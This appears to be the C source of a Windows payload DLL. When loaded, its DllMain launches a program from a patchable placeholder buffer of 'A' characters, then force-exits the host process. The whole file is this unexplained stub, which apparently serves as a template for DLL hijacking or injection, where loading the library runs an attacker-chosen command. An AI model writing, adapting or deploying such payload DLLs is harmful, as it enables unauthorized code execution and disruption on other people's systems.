//#include "stdafx.h"
#include "Windows.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		{
			char cmd[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
						 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			
			memset(&si, 0, sizeof(si));
			memset(&pi, 0, sizeof(pi));
			si.cb = sizeof(si);

			if (CreateProcess(cmd, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
			{
				CloseHandle(pi.hProcess);
				CloseHandle(pi.hThread);
			}

			ExitProcess(-69);
		}
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}